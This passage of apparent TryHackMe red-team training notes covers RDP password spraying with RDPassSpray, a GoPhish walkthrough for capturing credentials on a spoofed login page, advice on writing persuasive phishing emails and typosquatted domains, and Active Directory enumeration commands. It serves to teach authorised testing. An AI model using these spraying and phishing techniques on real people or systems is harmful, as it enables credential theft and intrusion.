                        Users list to use, one user per line
  -u USER, --user USER  Single user to use
  -p PASSWORD, --password PASSWORD
                        Single password to use
  -P PASSWORDLIST, --passwordlist PASSWORDLIST
                        Password list to use, one password per line
  -T TARGETLIST, --targetlist TARGETLIST
                        Targets list to use, one target per line
  -t TARGET, --target TARGET
                        Target machine to authenticate against
  -s SLEEP, --sleep SLEEP
                        Throttle the attempts to one attempt every # seconds, can be randomized by passing the value 'random' - default is 0  -r minimum_sleep maximum_sleep, --random minimum_sleep maximum_sleep
                        Randomize the time between each authentication attempt. Please provide minimun and maximum values in seconds
  -d DOMAIN, --domain DOMAIN
                        Domain name to use
  -n NAMES, --names NAMES
                        Hostnames list to use as the source hostnames, one per line
  -o OUTPUT, --output OUTPUT
                        Output each attempt result to a csv file
  -V, --verbose         Turn on verbosity to show failed attempts

```

Now, let's try using the (-u) option to specify the victim as a username and the (-p) option set the Spring2021!. The (-t) option is to select a single host to attack.

Hashcat

```
user@THM:~# python3 RDPassSpray.py -u victim -p Spring2021! -t 10.100.10.240:3026[13-02-2021 16:47] - Total number of users to test: 1
[13-02-2021 16:47] - Total number of password to test: 1
[13-02-2021 16:47] - Total number of attempts: 1
[13-02-2021 16:47] - [*] Started running at: 13-02-2021 16:47:40
[13-02-2021 16:47] - [+] Cred successful (maybe even Admin access!): victim :: Spring2021!

```

The above output shows that we successfully found valid credentials victim:Spring2021!. Note that we can specify a domain name using the -d option if we are in an Active Directory environment.

Hashcat

```
user@THM:~# python3 RDPassSpray.py -U usernames-list.txt -p Spring2021! -d THM-labs -T RDP_servers.txt
```

There are various tools that perform a spraying password attack against different services, such as:

### Outlook web access (OWA) portal

Tools:

- [SprayingToolkit](https://github.com/byt3bl33d3r/SprayingToolkit) (atomizer.py)
- [MailSniper](https://github.com/dafthack/MailSniper)

# SMB

- Tool: Metasploit (auxiliary/scanner/smb/smb_login)

## **PHISHING**

**Intro To Phishing Attacks**

Before you learn what phishing is, you'll need to understand the term social engineering. Social engineering
 is the psychological manipulation of people into performing or 
divulging information by exploiting weaknesses in human nature. These 
"weaknesses" can be curiosity, jealously, greed and even kindness and 
the willingness to help someone. Phishing is a source of social 
engineering delivered through email to trick someone into either 
revealing personal information, credentials or even executing malicious 
code on their computer.

These
 emails will usually appear to come from a trusted source, whether 
that's a person or a business. They include content that tries to tempt 
or trick people into downloading software, opening attachments, or 
following links to a bogus website.

A term you'll come across and the type of phishing campaign a red team would participate in is **spear-phishing,** as with throwing a physical spear; you'd have a target to aim at, the same can be said with spear-phishing
 in that you're targeting an individual, business or organisation rather
 than just anybody as mass. This is an effective form of phishing for a 
red team engagement as they are bespoke to the target it makes them hard
 to detect by technology such as spam filters, antivirus and firewalls.

A
 red team could be contracted to solely carry out a phishing assessment 
to see whether a business is vulnerable to this type of attack or can 
also be part of a broader scale assessment and used to gain access to 
computer systems or services.

Some
 other methods of phishing through other mediums are smishing which is 
phishing through SMS messages, and vishing which is performed through 
phone calls.

**Example Scenario:**

The below example scenario shows how an employee of a company could be tricked into revealing their credentials.

1) The attacker locates the physical location of the target business.

2) The attacker then looks for nearby food suppliers and discovers a company called **Ultimate Cookies!**

3) The Attacker registers the domain name **ultimate-cookies.thm**

4)
 The attacker then crafts an email to their target, tempting them with an
 offer of receiving some free cookies if they sign up to the website. 
Because the victim has heard of this local company, they are more likely 
to trust it.

5) The victim then follows the link in 
the email to the fake website created by the attacker and registers 
online. To keep things simple, the victim reuses the same password for 
all their online accounts.

6) The attacker now has 
the victim's email address and password and can log onto the victim's
 company email account. The attacker could now have access to private 
company information and also have somewhere to launch another phishing 
attack against other employees.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/087544a9380865490e4482fc3817c1f7.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/087544a9380865490e4482fc3817c1f7.png)

Next, you'll learn what goes on in setting up the infrastructure for a red team phishing campaign.

**Writing Convincing Phishing Emails**

We have three things to work with regarding phishing emails: the sender's email address, the subject and the content.

**The Senders Address:**

Ideally,
 the sender's address would be from a domain name that spoofs a 
significant brand, a known contact, or a coworker. See the Choosing A Phishing Domain task below for more information on this.

To find what brands or people a victim interacts with, you can employ OSINT (Open Source Intelligence) tactics. For example:

- Observe their social media account for any brands or friends they talk to.
- Searching Google for the victim's name and rough location for any reviews the
victim may have left about local businesses or brands.
- Looking at the victim's business website to find suppliers.
- Looking at LinkedIn to find coworkers of the victim.

**The Subject:**

You
 should set the subject to something quite urgent, worrying, or piques 
the victim's curiosity, so they do not ignore it and act on it quickly.

Examples of this could be:

1. Your account has been compromised.
2. Your package has been dispatched/shipped.
3. Staff payroll information (do not forward!)
4. Your photos have been published.

**The Content:**

If
 impersonating a brand or supplier, it would be pertinent to research 
their standard email templates and branding (style, logo's images, 
signoffs etc.) and make your content look the same as theirs, so the 
victim doesn't expect anything. If impersonating a contact or coworker, 
it could be beneficial to contact them; first, they may have some 
branding in their template, have a particular email signature or even 
something small such as how they refer to themselves, for example, 
someone might have the name Dorothy and their email is 
dorothy@company.thm. Still, in their signature, it might say "Best 
Regards, Dot". Learning these somewhat small things can sometimes have 
quite dramatic psychological effects on the victim and convince them 
more to open and act on the email.

If you've set up a spoof website to harvest data or distribute malware, the links to this should be disguised using the [**anchor text**](https://en.wikipedia.org/wiki/Anchor_text)
 and changing it either to some text which says "Click Here" or changing
 it to a correct looking link that reflects the business you are 
spoofing, for example:

`<a href="http://spoofsite.thm">Click Here</a>`

`<a href="http://spoofsite.thm">https://onlinebank.thm</a>`

**Phishing Infrastructure**

A certain amount of infrastructure will need to be put in place to launch a successful phishing campaign.

**Domain Name:**

You'll
 need to register either an authentic-looking domain name or one that 
mimics the identity of another domain. See task 5 for details on how to 
create the perfect domain name.

**SSL/TLS Certificates:**

Creating SSL/TLS certificates for your chosen domain name will add an extra layer of authenticity to the attack.

**Email Server/Account:**

You'll need to either set up an email server or register with an SMTP email provider.

**DNS Records:**

Setting up DNS
 Records such as SPF, DKIM, DMARC will improve the deliverability of 
your emails and make sure they're getting into the inbox rather than the
 spam folder.

**Web Server:**

You'll
 need to set up webservers or purchase web hosting from a company to 
host your phishing websites. Adding SSL/TLS to the websites will give 
them an extra layer of authenticity.

**Analytics:**

When
 a phishing campaign is part of a red team engagement, keeping analytics
 information is more important. You'll need something to keep track of 
the emails that have been sent, opened or clicked. You'll also need to 
combine it with information from your phishing websites for which users 
have supplied personal information or downloaded software.

**Automation And Useful Software:**

Some of the above infrastructures can be quickly automated by using the below tools.

**GoPhish - (Open-Source Phishing Framework) - [getgophish.com](https://getgophish.com/)**

GoPhish is a web-based framework to make setting up phishing campaigns more straightforward. GoPhish allows you to store your SMTP
 server settings for sending emails, has a web-based tool for creating 
email templates using a simple WYSIWYG (What You See Is What You Get) 
editor. You can also schedule when emails are sent and have an analytics
 dashboard that shows how many emails have been sent, opened or clicked.

The Next task will talk you through how to launch a phishing campaign using this software.

**SET - (Social Engineering Toolkit) - [trustedsec.com](https://www.trustedsec.com/tools/the-social-engineer-toolkit-set/)**

The
 Social Engineering Toolkit contains a multitude of tools, but some of 
the important ones for phishing are the ability to create spear-phishing attacks and deploy fake versions of common websites to trick victims into entering their credentials.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/9f0f844ee415917d739effc9e0234cc4.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/9f0f844ee415917d739effc9e0234cc4.png)

**Using GoPhish**

This task will take you 
through setting up GoPhish, sending a phishing campaign and capturing 
user credentials from a spoof website.

Firstly launch the virtual machine by clicking the green **Start Machine** button on the right; once loaded, click the following URL to open the GoPhish login page [https://LAB_WEB_URL.p.thmlabs.com:8443](https://lab_web_url.p.thmlabs.com:8443/)  or if you're connected to the TryHackMe VPN, you can to go [https://MACHINE_IP](https://machine_ip/)  (if you receive an Nginx error, wait another 30 seconds and try again).

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/06640644e0ff4b3f12fd96bce6c7a9ca.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/06640644e0ff4b3f12fd96bce6c7a9ca.png)

You should be able to log in with the username: **admin** and password: **tryhackme**

**Sending Profiles:**

Sending profiles are the connection details required to actually send your Phishing
 emails; this is just simply an SMTP server that you have access to. 
Click the Sending Profiles link on the left-hand menu and then click the
 "New Profile" button.

Next, add in the following information as per the screenshot below:

Name: **Local Server**

From: **noreply@redteam.thm**

Host: **127.0.0.1:25**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/2552180eb55c121e0268614de1fd522d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/2552180eb55c121e0268614de1fd522d.png)

Then click **Save Profile**.

**Landing Pages:**

Next, we're going to set up the landing page; this is the website that the Phishing email is going to direct the victim to; this page is usually a spoof of a website the victim is familiar with.

Click the Landing Pages link on the left-hand menu and then click the "New Page" button.

Give the Landing Page the name **ACME Login**, next in the HTML box; you'll need to press the **Source** button to allow us to enter the HTML code as shown below:

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>ACME IT SUPPORT - Admin Panel</title>
    <style>
        body { font-family: "Ubuntu", monospace; text-align: center }
        div.login-form { margin:auto; width:300px; border:1px solid #ececec; padding:10px;text-align: left;font-size:13px;}
        div.login-form div input { margin-bottom:7px;}
        div.login-form input { width:280px;}
        div.login-form div:last-child { text-align: center; }
        div.login-form div:last-child input { width:100px;}
    </style>
</head>
<body>
    <h2>ACME IT SUPPORT</h2>
    <h3>Admin Panel</h3>
    <form method="post">
        <div class="login-form">
            <div>Username:</div>
            <div><input name="username"></div>
            <div>Password:</div>
            <div><input type="password" name="password"></div>
            <div><input type="submit" value="Login"></div>
        </div>
    </form>
</body>
</html>
```

Click the **Source** button again, and you should see a login box with username and password fields as per the image below, also click the **Capture Submitted Data** box and then also the **Capture Passwords** box and then click the Save Page button.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/c46147f57dbac7f8ae02d2b44e0ed088.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/c46147f57dbac7f8ae02d2b44e0ed088.png)

**Email Templates:**

This
 is the design and content of the email you're going to actually send to
 the victim; it will need to be persuasive and contain a link to your 
landing page to enable us to capture the victim's username and password.
 Click the **Email Templates** link on the left-hand menu and then click the **New Template** button. Give the template the name **Email 1**, the subject **New Message Received**,
 click the HTML tab, and then the Source button to enable HTML editor 
mode. In the contents write a persuasive email that would convince the 
user to click the link, the link text will need to be set to [**https://admin.acmeitsupport.thm**](https://admin.acmeitsupport.thm/), but the actual link will need to be set to **{{.URL}}**
 which will get changed to our spoofed landing page when the email gets 
sent, you can do this by highlighting the link text and then clicking 
the link button on the top row of icons, make sure to set the **protocol** dropdown to **<other>**.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/5a41d611e4d01c56aa74ca5e7867138b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/5a41d611e4d01c56aa74ca5e7867138b.png)

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/84f89f412b27060f51575e861c8dd1e6.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/84f89f412b27060f51575e861c8dd1e6.png)

Your email should look similar to the screenshot below. Click **Save Template** once complete.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/66c60935fa89bf7517c4bdc194cce3d4.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/66c60935fa89bf7517c4bdc194cce3d4.png)

**Users & Groups**

This is where we can store the email addresses of our intended targets. Click the **Users & Groups** link on the left-hand menu and then click the **New Group** button. Give the group the name **Targets** and then add the following email addresses:

martin@acmeitsupport.thm

brian@acmeitsupport.thm

accounts@acmeitsupport.thm

Click the **Save Template** button; once completed, it should look like the below screenshot:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/ea9aa63c0ba57459b05628da47f1a9a3.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/ea9aa63c0ba57459b05628da47f1a9a3.png)

**Campaigns**

Now it's time to send your first emails; click the **Campaigns** link on the left-hand menu and then click the **New Campaign** button. Set the following values for the inputs, as per the screenshot below:

Name: Campaign One

Email Template: Email 1

Landing Page: ACME Login

URL: [http://MACHINE_IP](http://machine_ip/)

Launch
 Date: For this lab set it to 2 days ago just to make sure there is no 
complication with different timezones, in a real operation this would be
 set correctly.

Sending Profile: Local Server

Groups: Targets

Once completed, click the **Launch Campaign** button, which will produce an **Are You Sure** prompt where you can just press the **Launch** button.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/e70ffbbe29b1d8cd4085e66350300e59.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/e70ffbbe29b1d8cd4085e66350300e59.png)

You'll then be redirected to the results page of the campaign.

**Results**

The
 results page gives us an idea of how the phishing campaign is 
performing by letting us know how many emails have been delivered, 
opened, clicked and how many users have submitted data to our spoof 
website.

You'll see at the bottom of the screen a
 breakdown for each email address; you'll notice that both Martin's and 
Brian's email has been sent successfully, but the account's email has 
resulted in an error.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/ca6b76d74516da1db95ccebebf7d9423.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/ca6b76d74516da1db95ccebebf7d9423.png)

We
 can dig in the error more by clicking the dropdown arrow next to the 
account's row, and by viewing the details or the error, we can see an 
error message saying the user is unknown.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/282f9bc37ff6fac45a87348e75ea1205.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/282f9bc37ff6fac45a87348e75ea1205.png)

After a minute and providing you've followed the instructions correctly, you should see the status of brian change to **Submitted Data.**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/437e3dd0c50de7b7c2bf45cb07eb57dc.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/437e3dd0c50de7b7c2bf45cb07eb57dc.png)

Expanding
 Brian's details and then viewing the details for the submitted data, 
you should be able to see Brian's username and password, which will help
 you answer the question below.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/68c81327e142c55eece9d0c2ed02794d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/68c81327e142c55eece9d0c2ed02794d.png)

**Droppers**

Droppers are software 
that phishing victims tend to be tricked into downloading and running on
 their system. The dropper may advertise itself as something useful or 
legitimate such as a codec to view a certain video or software to open a
 specific file.

The droppers are not usually malicious themselves,
 so they tend to pass antivirus checks. Once installed, the intended 
malware is either unpacked or downloaded from a server and installed 
onto the victim's computer. The malicious software usually connects back
 to the attacker's infrastructure. The attacker can take control of the 
victim's computer, which can further explore and exploit the local 
network.

**Choosing A Phishing Domain**

Choosing the right Phishing
 domain to launch your attack from is essential to ensure you have the 
psychological edge over your target. A red team engagement can use some 
of the below methods for choosing the perfect domain name.

**Expired Domains:**

Although
 not essential, buying a domain name with some history may lead to 
better scoring of your domain when it comes to spam filters. Spam 
filters have a tendency to not trust brand new domain names compared to 
ones with some history.

**Typosquatting:**

Typosquatting
 is when a registered domain looks very similar to the target domain 
you're trying to impersonate. Here are some of the common methods:

**Misspelling:** goggle.com Vs google.com

**Additional Period:** go.ogle.com Vs google.com

**Switching numbers for letters:** g00gle.com Vs google.com

**Phrasing:** googles.com Vs google.com

**Additional Word:** googleresults.com Vs google.com

These
 changes might look unrealistic, but at a glance, the human brain tends 
to fill in the blanks and see what it wants to see, i.e. the correct 
domain name.

**TLD Alternatives:**

A
 TLD (Top Level Domain) is the .com .net .co.uk .org .gov e.t.c part of 
 a domain name, there are 100's of variants of TLD's now. A common trick
 for choosing a domain would be to use the same name but with a 
different TLD. For example, register tryhackme.co.uk to impersonate 
tryhackme.com.

**IDN Homograph Attack/Script Spoofing:**

Originally
 domain names were made up of Latin characters a-z and 0-9, but in 1998,
 IDN (internationalized domain name) was implemented to support 
language-specific script or alphabet from other languages such as 
Arabic, Chinese, Cyrillic, Hebrew and more. An issue that arises from 
the IDN implementation is that different letters from different 
languages can actually appear identical. For example, Unicode character 
U+0430 (Cyrillic small letter a) looks identical to Unicode character 
U+0061 (Latin small letter a) used in English, enabling attackers to 
register a domain name that looks almost identical to another.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/b9db37d17587bf4b5849319f07ea1931.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/b9db37d17587bf4b5849319f07ea1931.png)

**Using MS Office In Phishing**

Often
 during phishing campaigns, a Microsoft Office document (typically Word,
 Excel or PowerPoint) will be included as an attachment. Office 
documents can contain macros; macros do have a legitimate use but can 
also be used to run computer commands that can cause malware to be 
installed onto the victim's computer or connect back to an attacker's 
network and allow the attacker to take control of the victim's computer.

**Take, for example, the following scenario:**

A
 staff member working for Acme IT Support receives an email from human 
resources with an excel spreadsheet called "Staff_Salaries.xlsx" 
intended to go to the boss but somehow ended up in the staff members 
inbox instead.

What
 really happened was that an attacker spoofed the human resources email 
address and crafted a psychologically tempting email perfectly aimed to 
tempt the staff member into opening the attachment.

Once the staff member opened the attachment and enabled the macros, their computer was compromised.

**Using Browser Exploits**

Another method of 
gaining control over a victim's computer could be through browser 
exploits; this is when there is a vulnerability against a browser itself
 (Internet Explorer/Edge, Firefox, Chrome, Safari, etc.), which allows 
the attacker to run remote commands on the victim's computer.

Browser
 exploits aren't usually a common path to follow in a red team 
engagement unless you have prior knowledge of old technology being used 
on-site. Many browsers are kept up to date, hard to exploit due to how 
browsers are developed, and the exploits are often worth a lot of money 
if reported back to the developers.

That being said, it can 
happen, and as previously mentioned, it could be used to target old 
technologies on-site because possibly the browser software cannot be 
updated due to incompatibility with commercial software/hardware, which 
can happen quite often in big institutions such as education, government
 and especially health care.

Usually, the victim would receive an
 email, convincing them to visit a particular website set up by the 
attacker. Once the victim is on the site, the exploit works against the 
browser, and now the attacker can perform any commands they wish on the 
victim's computer.

An example of this is [CVE-2021-40444](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444)
 from September 2021, which is a vulnerability found in Microsoft 
systems that allowed the execution of code just from visiting a website.

## **POST COMPROMISE**

### **The Lay of the land**

**Network Infrastructure**

Once arriving onto an 
unknown network, our first goal is to identify where we are and what we 
can get to. During the red team engagement, we need to understand what 
target system we are dealing with, what service the machine provides, 
what kind of network we are in. Thus, the enumeration of the compromised
 machine after getting initial access is the key to answering these 
questions. This task will discuss the common types of networks we may face during the engagement.

Network
 segmentation is an extra layer of network security divided into 
multiple subnets. It is used to improve the security and management of 
the network. For example, it is used for preventing unauthorized access 
to corporate most valuable assets such as customer data, financial 
records, etc.

The Virtual Local Area Networks (VLANs) is a network
 technique used in network segmentation to control networking issues, 
such as broadcasting issues in the local network, and improve 
security. Hosts within the VLAN can only communicate with other hosts in
 the same VLAN network.

If you want to learn more about network fundamentals, we suggest trying the following TryHackMe module: [Network Fundamentals](https://tryhackme.com/module/network-fundamentals).

# Internal Networks

Internal
 Networks are subnetworks that are segmented and separated based on the 
importance of the internal device or the importance of the accessibility
 of its data. The main purpose of the internal network(s) is to share 
information, faster and easier communications, collaboration tools, 
operational systems, and network services within an organization. In
 a corporate network, the network administrators intend to use network 
segmentation for various reasons, including controlling network traffic,
 optimizing network performance, and improving security posture.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/f86b9cce1276f4c317bcb4bae7686891.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/f86b9cce1276f4c317bcb4bae7686891.png)

The
 previous diagram is an example of the simple concept of network 
segmentation as the network is divided into two networks. The first one 
is for employee workstations and personal devices. The second is for 
private and internal network devices that provide internal services such
 as DNS, internal web, email services, etc.

# A Demilitarized Zone ()

A DMZ
 Network is an edge network that protects and adds an extra security 
layer to a corporation's internal local-area network from untrusted 
traffic. A common design for DMZ is a subnetwork that sits between the 
public internet and internal networks.

Designing a
 network within the company depends on its requirements and need. For 
example, suppose a company provides public services such as a website, DNS,
 FTP, Proxy, VPN, etc. In that case, they may design a DMZ network to 
isolate and enable access control on the public network traffic, 
untrusted traffic.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/df4d771470f80491ece99e42ee574ebf.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/df4d771470f80491ece99e42ee574ebf.png)

In the previous diagram, we represent the network traffic to the DMZ
 network in red color, which is untrusted ( comes directly from the 
internet). The green network traffic between the internal network is the
 controlled traffic that may go through one or more than one network 
security device(s).

Enumerating the system and the 
internal network is the discovering stage, which allows the attacker to 
learn about the system and the internal network. Based on the gained 
information, we use it to process lateral movement or privilege 
escalation to gain more privilege on the system or the AD environment.

# Network Enumeration

There are various things to check related to networking aspects such as TCP and UDP ports and established connections, routing tables, ARP tables, etc.

Let's start checking the target machine's TCP and UDP open ports. This can be done using the netstat command as shown below.

Command Prompt

```
PS C:\Users\thm> netstat -na

Active Connections

  Proto  Local Address          Foreign Address        State
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING
```

The output reveals the open ports as well as the established connections. Next, let's list the ARP
 table, which contains the IP address and the physical address of the 
computers that communicated with the target machines within the network.
 This could be helpful to see the communications within the network to 
scan the other machines for open ports and vulnerabilities.

Command Prompt

```
PS C:\Users\thm> arp -a

Interface: 10.10.141.51 --- 0xa
  Internet Address      Physical Address      Type
  10.10.0.1             02-c8-85-b5-5a-aa     dynamic
  10.10.255.255         ff-ff-ff-ff-ff-ff     static
```

# Internal Network Services

It
 provides private and internal network communication access for internal
 network devices. An example of network services is an internal DNS,
 web servers, custom applications, etc. It is important to note that the
 internal network services are not accessible outside the network. 
However, once we have initial access to one of the networks that access 
these network services, they will be reachable and available for 
communications.

**Active Directory (AD) environment**

# What is the Active Directory () environment?

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/a8e30315a65f3451771a2e038864fdee.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/a8e30315a65f3451771a2e038864fdee.png)

It
 is a Windows-based directory service that stores and provides data 
objects to the internal network environment. It allows for centralized 
management of authentication and authorization. The AD
 contains essential information about the network and the environment, 
including users, computers, printers, etc. For example, AD might have 
users' details such as job title, phone number, address, passwords, 
groups, permission, etc.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/59664b98a3a0b01cf6b7e83e039ddb84.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/59664b98a3a0b01cf6b7e83e039ddb84.png)

The diagram is one possible example of how Active Directory can be designed. The AD
 controller is placed in a subnet for servers (shown above as server 
network), and then the AD clients are on a separate network where they 
can join the domain and use the AD services via the firewall.

The following is a list of Active Directory components that we need to be familiar with:

- Domain Controllers
- Organizational Units
- AD objects
- AD Domains
- Forest
- AD Service Accounts: Built-in local users, Domain users, Managed service accounts
- Domain Administrators

A **Domain Controller** is a Windows server that provides Active Directory services and controls the entire domain. It is a form of centralized user management that provides encryption of user data as well as controlling access to a network, including users, groups, policies, and computers. It also enables resource access and sharing. These are all reasons why attackers target a domain controller in a domain because it contains a lot of high-value information.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/c982e300552d540f0fc456cc05be21cd.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/c982e300552d540f0fc456cc05be21cd.png)

**Organizational Units (OU's)** are containers within the AD domain with a hierarchical structure.

**Active Directory Objects** can be a single user or a group, or a hardware component, such as a computer or printer. Each domain holds a database that contains object identity information that creates an AD environment, including:

- Users - A security principal that is allowed to authenticate to machines in the domain
- Computers - A special type of user accounts
- GPOs - Collections of policies that are applied to other AD objects

AD domains are a collection of Microsoft components within an AD network.

AD Forest is a collection of domains that trust each other.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/bb4bec81a78f745e8cbc38f7879002dd.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/bb4bec81a78f745e8cbc38f7879002dd.png)

For more information about the basics of Active Directory, we suggest trying the following TryHackMe room: [Active Directory Basics](https://tryhackme.com/room/winadbasics).

Once Initial Access has been achieved, finding an AD
 environment in a corporate network is significant as the Active 
Directory environment provides a lot of information to joined users 
about the environment. As a red teamer, we take advantage of this by enumerating the AD environment and gaining access to various details, which can then be used in the lateral movement stage.

**Users and Groups Management**

In this
 task, we will learn more about users and groups, especially within the 
Active Directory. Gathering information about the compromised machine is
 essential that could be used in the
 next stage. Account discovery is the first step once we have gained 
initial access to the compromised machine to understand what we have and
 what other accounts are in the system.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/d981e1c73997b17ace78454c87b8a8c1.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/d981e1c73997b17ace78454c87b8a8c1.png)

An
 Active Directory environment contains various accounts with the 
necessary permissions, access, and roles for different purposes. Common 
Active Directory service accounts include built-in local user accounts, 
domain user accounts, managed service accounts, and virtual accounts.

- The built-in local users' accounts are used to manage the system locally, which is not part of the AD environment.
- Domain user accounts with access to an active directory environment can use the AD services (managed by AD).
- AD managed service accounts are limited domain user account with higher privileges to manage AD services.
- Domain Administrators are user accounts that can manage information in an Active Directory environment, including AD configurations, users, groups, permissions, roles, services, etc. One
of the red team goals in engagement is to hunt for information that
leads to a domain administrator having complete control over the AD
environment.

The following are Active Directory Administrators accounts:

| BUILTIN\Administrator | Local admin access on a domain controller |
| --- | --- |
| Domain Admins | Administrative access to all resources in the domain |
| Enterprise Admins | Available only in the forest root |
| Schema Admins | Capable of modifying domain/forest; useful for red teamers |
| Server Operators | Can manage domain servers |
| Account Operators | Can manage users that are not in privileged groups |

Now that we learn about various account types within the AD environment. Let's enumerate the Windows machine that
 we have access to during the initial access stage. As a current user, 
we have specific permissions to view or manage things within the machine
 and the AD environment.

# Active Directory () Enum

Now, enumerating in the AD environment requires different tools and techniques. Once we confirm that the machine is part of the AD
 environment, we can start hunting for any variable info that may be 
used later. In this stage, we are using PowerShell to enumerate for 
users and groups.

The following PowerShell command is to get all active directory user accounts. Note that we need to use  -Filter argument.

PowerShell

```
PS C:\Users\thm> Get-ADUser  -Filter *
DistinguishedName : CN=Administrator,CN=Users,DC=thmredteam,DC=com
Enabled           : True
GivenName         :
Name              : Administrator
ObjectClass       : user
ObjectGUID        : 4094d220-fb71-4de1-b5b2-ba18f6583c65
SamAccountName    : Administrator
SID               : S-1-5-21-1966530601-3185510712-10604624-500
Surname           :
UserPrincipalName :
PS C:\Users\thm>
```

We can also use the [LDAP hierarchical tree structure](http://www.ietf.org/rfc/rfc2253.txt) to find a user within the AD
 environment. The Distinguished Name (DN) is a collection of 
comma-separated key and value pairs used to identify unique records 
within the directory. The DN consists of Domain Component (DC), 
OrganizationalUnitName (OU), Common Name (CN), and others. The 
following "CN=User1,CN=Users,DC=thmredteam,DC=com" is an example of DN, which can be visualized as follow:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/764c72d40ec3d823b05d6473702e00f5.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/764c72d40ec3d823b05d6473702e00f5.png)

Using the SearchBase option, we specify a specific Common-Name CN in the active directory. For example, we can specify to list any user(s) that part of Users.

PowerShell

```
PS C:\Users\thm> Get-ADUser -Filter * -SearchBase "CN=Users,DC=THMREDTEAM,DC=COM"

DistinguishedName : CN=Administrator,CN=Users,DC=thmredteam,DC=com
Enabled           : True
GivenName         :
Name              : Administrator
ObjectClass       : user
ObjectGUID        : 4094d220-fb71-4de1-b5b2-ba18f6583c65
SamAccountName    : Administrator
SID               : S-1-5-21-1966530601-3185510712-10604624-500
Surname           :
UserPrincipalName :
```

**Host Security Solution #1**

Before performing 
further actions, we need to obtain general knowledge about the security 
solutions in place. Remember, it is important to enumerate antivirus and
 security detection methods on an endpoint in order to stay as 
undetected as possible and reduce the chance of getting caught.

This task will discuss the common security solution used in corporate networks, divided into Host and Network security solutions.

# Host Security Solutions

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/0e69d6b953d1c9c11d8581d31ea246d8.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/0e69d6b953d1c9c11d8581d31ea246d8.png)

It is a set of software applications used to monitor and detect abnormal and malicious activities within the host, including:

1. Antivirus software
2. Microsoft Windows Defender
